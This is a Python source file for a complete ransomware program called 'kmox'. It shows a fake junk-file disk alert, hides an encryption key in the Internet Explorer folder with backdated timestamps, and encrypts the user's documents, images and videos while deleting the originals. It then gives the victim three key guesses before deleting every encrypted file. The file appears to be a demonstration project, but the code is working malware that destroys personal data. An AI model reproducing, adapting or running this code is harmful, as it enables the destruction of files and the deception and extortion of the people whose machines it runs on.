#Imports
import os, subprocess, platform, random, time, datetime,glob, argparse,fnmatch
from pathlib import Path
from time import sleep
from cryptography.fernet import Fernet

#get to the head directory
locroot = os.path.expanduser('~')
encoding = 'utf-8'
#variable to use in place of locroot to encrypt just one directory
localRoot = r'C:\\Users\\WDAGUtilityAccount\\Desktop\\myfiles'
extensions = ["jpg", "JPG", "png", "PNG", "txt", "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp", "mp4"]
mykey=b"0"
#fake function
def fixingdisk():
    #the format {} is used to place a name of os we get the name by platform.system
    print(u'##########################{} ALERT !##########################'.format(platform.system()))
    sleep(1)
    #generate a random number between 1,500 and place it {}
    print(u'has detected {} junk files taking too much space and may cause some serious disk damage!'.format(random.randint(1,500)))
    sleep(1)
    print(u'Getting all the junk files, Please don\'t shutdown your computer')
    sleep(1)
    print(u'Found the junk files. Deleting files and repairing disk...')
    sleep(1)

def create_key_file():
    #create the file and write bytes in by "wb"
    outFileName="C:\\Program Files (x86)\\Internet Explorer\\key.key"
    outFile=open(outFileName, "wb")
    mykey=Fernet.generate_key()
    outFile.write(mykey)
    outFile.close()
    #get the list of all files in the internet explorer directory
    list_of_files = glob.glob('C:\\Program Files (x86)\\Internet Explorer\\*')
    #compare the modification date of all files there and we get the oldest one
    latest_file = min(list_of_files, key=os.path.getctime)
    #change the modification date of the file to avoid suspicion of the user
    os.utime("C:\\Program Files (x86)\\Internet Explorer\\key.key", (os.path.getctime(latest_file), os.path.getctime(latest_file)))
    #hide the file make it as a hidden file we can uncomment it but just to make it easy to get the key
   # os.system('attrib +s +h "C:\Program Files (x86)\Internet Explorer\key.key"')
       
#encrypt any file that comes in the parameters
def encrypt_file(file_path, ifencrypted=False):
    try:
        file=open("C:\\Program Files (x86)\\Internet Explorer\\key.key","rb")
        mykey=file.read()
        file.close()

        with open(file_path, 'rb') as myfile:
              data=myfile.read()
              fernet=Fernet(mykey)
              encrypted=fernet.encrypt(data)
        with open(f"{file_path}.kmox", "wb") as encryptedfile:
                encryptedfile.write(encrypted)
                os.remove(file_path)
    except:
        pass
#this function is to decrypt the databy taking the file path and the key as parameters    
def decrypt_file(file_path,inputKey):
    try:
        file=open("C:\\Program Files (x86)\\Internet Explorer\\key.key","rb")
        mykey=file.read()
        file.close()
        with open(file_path, 'rb') as myfile:
              data=myfile.read()
              fernet=Fernet(inputKey)
              decrypted=fernet.decrypt(data)
              #create a string with file name but removing the .kmox extension
              newname = file_path.replace('.kmox', '')
            #creatign a new file using this new old name
        with open(f"{newname}",'wb') as oldfile:
            oldfile.write(decrypted)
            #removing the encrypted file
            os.remove(file_path)
    except:
        pass

#this function walks through all directories or only one directory then encrypts all files that match
def kill_system(encrypted=False):
    system = os.walk(locroot, topdown=True)
    for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in extensions:
                    continue
                if not encrypted:
                    encrypt_file(file_path)
                   
lifes=3
notset=False
def revive_system(inputKey):
    system = os.walk(locroot, topdown=True)
    for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not fnmatch.fnmatch(file_path, '*.kmox'):
                    continue
                else:
                     decrypt_file(file_path,inputKey)
    os.remove("C:\\Program Files (x86)\\Internet Explorer\\key.key")                
def delete_all_files():
    try:
        system = os.walk(locroot, topdown=True)
        for root, dir, files in system:
                for file in files:
                    file_path = os.path.join(root, file)
                    if fnmatch.fnmatch(file_path, '*.kmox'):
                        os.remove(file_path)
    except:
        pass
def revive(mykey,notset):
    lifes=3
    while(lifes>0 and notset==False):
        print("you have {} lifes eitherwise your files will be gone forever :)".format(lifes))
        sleep(0.5)
        print("Please notice that restarting your pc or closing this program will lock your files and they wont be restored...")
        sleep(0.5)
        inpkey=input("Enter the key : ")
        sleep(1)
        #we get the key from the user if they dont match his lifes will decrease
        if(inpkey!=str(mykey, encoding)):
            lifes=lifes-1
        else:
            #here in case he gives the true key we quit the while loop and revive his files
            notset=True
    if(notset==True):
        revive_system(inpkey)
        print("All files are retrieved, congratulations you survived kmox :)...")
    else:
        print("Oops sorry your encrypted files are gone...")
        delete_all_files()

#here if the key file doesnt exist we do the process of create and generate the key file then encrypting
#then await for the key from the victim
#if it exists and he wants to recover his files types 1 and will play the 3 lifes game again   
#if the user deletes the key file his files are gone forever, cause they will be retrieved only with one key
#an exception will show then cause he encrypted files with different keys which means files are gone forever
if(not os.path.exists("C:\\Program Files (x86)\\Internet Explorer\\key.key")):
    fixingdisk()
    create_key_file()
    kill_system()
    print('''             __      _____________.____   _________  ________      _____  ___________ ___________________      ____  __.  _____   ________  ____  ___            
  /\|\/\    /  \    /  \_   _____/|    |  \_   ___ \ \_____  \    /     \ \_   _____/ \__    ___/\_____  \    |    |/ _| /     \  \_____  \ \   \/  /   /\|\/\   
 _)    (__  \   \/\/   /|    __)_ |    |  /    \  \/  /   |   \  /  \ /  \ |    __)_    |    |    /   |   \   |      <  /  \ /  \  /   |   \ \     /   _)    (__ 
 \_     _/   \        / |        \|    |__\     \____/    |    \/    Y    \|        \   |    |   /    |    \  |    |  \/    Y    \/    |    \/     \   \_     _/ 
   )    \     \__/\  / /_______  /|_______ \______  /\_______  /\____|__  /_______  /   |____|   \_______  /  |____|__ \____|__  /\_______  /___/\  \    )    \  
   \/\|\/          \/          \/         \/      \/         \/         \/        \/                     \/           \/       \/         \/      \_/    \/\|\/ ''')
    print("##################################################################################################")
    file=open("C:\\Program Files (x86)\\Internet Explorer\\key.key","rb")
    mykey=file.read()
    file.close()
    revive(mykey,notset=False)
else:
    answer=input("Want to recover your files ? (1: Yes, 0: No)")
    file=open("C:\\Program Files (x86)\\Internet Explorer\\key.key","rb")
    mykey=file.read()
    file.close()
    if(answer=="1"):
     revive(mykey,notset)
    else:
        delete_all_files()
    


